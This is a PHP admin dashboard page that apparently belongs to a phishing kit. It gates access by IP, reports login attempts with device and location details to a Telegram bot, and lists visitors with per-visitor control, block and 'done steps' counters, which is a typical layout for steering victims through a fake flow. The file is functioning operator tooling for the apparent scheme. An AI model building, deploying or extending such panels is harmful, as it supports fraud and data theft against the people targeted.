<?php 
    error_reporting(0);
    session_start();
    include "../../libraries/get-country-code.php";
    include "../../setting/functions.php";
    include "../../setting/alert-admin.php";
    include "../../setting/config.php";
    include "../../libraries/UserInfo.php";

    $jsonFilePath = "../admin/admin.json";
    $json_data = file_get_contents($jsonFilePath);
    $user_data = json_decode($json_data, true);
    $login_status = $user_data['login_status'];
    $token_admin = TOKEN;
    $chat_id_admin = CHATID;
    $ip = get_client_ip();
    $present_time = date("H:i:s"."-"."m/d/y");

    $ip_found = false;
    foreach ($user_data['login_status'] ?? [] as $login) {
        if ($login['ip'] === $ip) {
            $ip_found = true;
            break;
        }
    }
    
    if (!$ip_found) {
        $_SESSION["message_login"] = "Please log in to access this page. Or Your Ip Address is Change - " . $ip;

        $log = "Please log in to access this page. Or Your Ip Address is Change - " . $ip;

        // Send Data To Telegram :
        $message= urlencode("🔐========= Login Status =========🔐\r\n" . 
        "📍IP - ".get_client_ip()."\t\t | \t\t". 
        $detector->api() ."\r\n".
        "📊 Login Status = " .$log."\r\n".
        "💻 DEVICE = " .UserInfo::get_device()."\r\n".
        "♻️ SYSTEM TYPE = ". UserInfo::get_os()."\r\n". 
        "🌐 BROWSER VISIT = ". UserInfo::get_browser()."\r\n".
        "DATE AND TIME = ". $present_time ."\r\n".
        "🔐========= Login Status =========🔐\r\n");
        telegram($token_admin, $message, $chat_id_admin);

        echo 
        "<script>
            window.location.replace('./login.php');
        </script>";
        exit;
    }

?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <!-- SEO -->
    <?php include '../../libraries/seo.php'; ?>
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
    <link rel="stylesheet" href="../css/panel.css">
    <!-- Font Awesome Library -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.1.1/css/all.min.css" integrity="sha512-KfkfwYDsLkIlwQp6LFnl8zNdLGxu9YAA1QvwINks4PhcElQSvqcyVLLD9aMhXd13uQjoXtEKNosOWaZqXgel0g==" crossorigin="anonymous" referrerpolicy="no-referrer" />
    <!-- Favicon -->
    <link rel="icon" href="../img/favicon.png">
    <link rel="shortcut" href="../img/favicon.png">
    <link rel="appel-touch-icon" href="../img/favicon.png">
    <title>Main Panel</title>
</head>
<body>
    <!-- Start Nav Bar -->
    <nav>
        <div class="content-nav">
            <h3><img src="../img/favicon.png" alt=""> Admin Dashboard</h3> 
            <div class="parent-buttons-setting" id="menu">
                <button id="updatePage" class="buttons-settings"> <i class="fa-solid fa-rotate-right"></i>Realod</button>
                <a class="buttons-settings" href="#table-panel" id="clearTableInformationUser" class="buttons-settings"><i class="fa-solid fa-trash-can"></i>Clear Table</a>
                <a class="buttons-settings" target="_blank" href="./settings.php"><i class="fa-solid fa-gear"></i>Settings</a>
                <a class="buttons-settings" href="#table-panel"><i class="fa-solid fa-table"></i>Panel Table</a>
                <a class="buttons-settings" href="#statics-panel"><i class="fa-solid fa-square-poll-vertical"></i>Statics Panel</a>
                <form action="../actions/logout.php" method="post">
                    <button type="submit" name="logout" class="buttons-settings"><i class="fa-solid fa-right-from-bracket"></i>Logout</button>
                </form>
            </div>
            <button class="button-menu" id="buttonMenu"><i class="fa-solid fa-bars" id="buttonIcon"></i>Menu</button>
        </div>
    </nav>
    <!-- End Nav Bar -->

    <!-- Start Statics And Progress-->
    <div class="parent-statics"  id="statics-panel">
        <h3 class="titles"><i class="fa-solid fa-chart-column" style="margin-right: 10px !important;"></i>Statics Panel</h3>
            <!-- Start Message Actions -->
            <?php 
                if (isset($_SESSION["message_panel"])) {
                    echo "<div class='message-panel'>" .  $_SESSION["message_panel"] . "</div>";
                    unset($_SESSION["message_panel"]);
                }
            ?>
            <!-- Start Message Actions -->
        <div class="content-statics">
            <div class="statics">
                <div id="chart"></div>
                <div class="totals">
                    <p>Total Visits: <i class="fa-solid fa-square blue"></i> <span id="visit-count"></span></p>
                    <p>Total Blocks: <i class="fa-solid fa-square red"></i> <span id="block-count"></span></p>
                    <p>Total Done Steps: <i class="fa-solid fa-square green"></i> <span id="steps-count"></span></p>
                </div>
            </div>
        </div>
    </div>
    <h3 class="titles"><i class="fa-solid fa-chart-line" style="margin-right: 10px !important;"></i>Progress</h3>
    <div class="progress-section">
        <div class="box-progress">        
            <span class="title-preview">Total Visitor</span>
            <div class="numbers-count"><i class="fa-solid fa-eye"></i> <span class="text-numbers" id="visitors"></span></div>
        </div>
        <div class="box-progress">        
            <span class="title-preview">Total Blocked</span>
            <div class="numbers-count"><i class='fa-solid fa-user-minus'></i> <span class="text-numbers" id="blockedUsers"></span></div>
        </div>
        <div class="box-progress">        
            <span class="title-preview">Total Done</span>
            <div class="numbers-count"><i class="fa-solid fa-circle-check"></i> <span class="text-numbers" id="stepsDone"></span></div>
        </div>
    </div>
    <!-- End Statics And Progress -->
    
    <!-- Start Table User Information -->
    <h3 class="titles" id="table-panel"><i class="fa-solid fa-diagram-project" style="margin-right: 10px !important;"></i>Panel Table</h3>
    <div class="parent-table" id="dashboard" >
        <table class="table">
            <thead>
                <tr>
                    <th><i class="fa-solid fa-id-badge"></i> #Id</th>
                    <th><i class="fa-solid fa-wifi"></i>IP_Address</th>
                    <th><i class="fa-solid fa-clock-rotate-left"></i>Time</th>
                    <th><i class="fa-solid fa-user-shield"></i>User_Agent</th>
                    <th><i class="fa-solid fa-square-poll-vertical"></i>Panel_Control</th>
                    <th><i class="fa-solid fa-trash"></i>Remove_ID</th>
                    <th><i class="fa-solid fa-circle-stop"></i>Block</th>
                </tr>
            </thead>
            <tbody id="dynamicSection" class="dynamic-section">
            </tbody>
        </table>
    </div>
    <!-- End Table User Information -->


    <!-- Scripts -->
    <script src="../js/script.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/apexcharts"></script>

</body>
</html>
